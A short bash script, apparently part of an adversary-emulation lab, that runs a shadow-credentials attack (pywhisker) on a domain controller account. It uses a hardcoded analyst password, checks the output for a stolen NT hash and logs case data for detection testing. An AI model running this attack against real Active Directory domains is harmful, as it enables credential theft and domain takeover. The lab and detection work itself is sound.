#!/usr/bin/env bash
# T008 — Shadow credentials on dc01$ from ws01 (pywhisker in-process)
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T008-SHADOW-CREDS-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== T008 Shadow credentials | ${CASE_ID} | T0=${T0} ==="

OUT="$(campaign_stage_run_ps1 analyst_t1 'T13r_An@lyst!' t008-shadow-creds-dc01.ps1)"
printf '%s\n' "${OUT}" | tee "/tmp/${CASE_ID}.out"
campaign_require_ok T008 "${OUT}" 'T008_OK|NTHASH|T008_DONE'

cadre_export "${CASE_ID}" T008 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T008 run complete ==="
